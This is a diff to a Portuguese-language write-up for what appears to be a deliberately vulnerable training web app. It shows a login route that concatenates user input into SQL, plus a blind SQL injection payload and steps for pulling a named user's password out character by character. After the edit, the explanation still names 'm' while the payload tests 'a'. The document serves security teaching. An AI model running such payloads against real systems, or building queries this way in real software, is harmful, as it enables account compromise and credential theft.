@@ -32,7 +32,7 @@ A página de login também é vulnerável à injeção SQL. As entradas do usuá
 app.post("/login", (req, res) => {
   const { username, password } = req.body;
 
-  // VULNERÁVEL: Injeção SQL cega na consulta de login
+  // VULNERÁVEL: Blind SQLi cega na consulta de login
   // concatenando diretamente a entrada do usuário na consulta SQL
   const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
 
@@ -69,15 +69,15 @@ app.post("/post", (req, res) => {
 Ao postar uma mensagem, você pode usar o seguinte payload no campo de conteúdo para extrair informações de senha caractere por caractere:
 
 ```
-Teste', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='m' THEN 'success' ELSE 'fail' END)) -- '
+Essa mensagem não tem nenhum payload', (SELECT CASE WHEN (SELECT substr(password,1,1) FROM users WHERE username='PaulAtreides')='a' THEN 'success' ELSE 'fail' END)) -- '
 ```
 
-Esta injeção:
+#### Explicação do Payload:
 
 1. Fecha a string atual com uma aspa e adiciona uma vírgula
 2. Usa uma instrução CASE para verificar se o primeiro caractere da senha de Paul é 'm'
 3. Comenta o resto da consulta
 
-Se o primeiro caractere for 'm', a consulta é executada com sucesso. Se não, ela falha devido a erros de sintaxe SQL.
+Se o primeiro caractere for 'a', a consulta é executada com sucesso. Se não, ela falha devido a erros de sintaxe SQL.
 
 Para extrair a senha completa, modifique a posição (altere `1,1` para `2,1` para o segundo caractere) e tente diferentes caracteres.
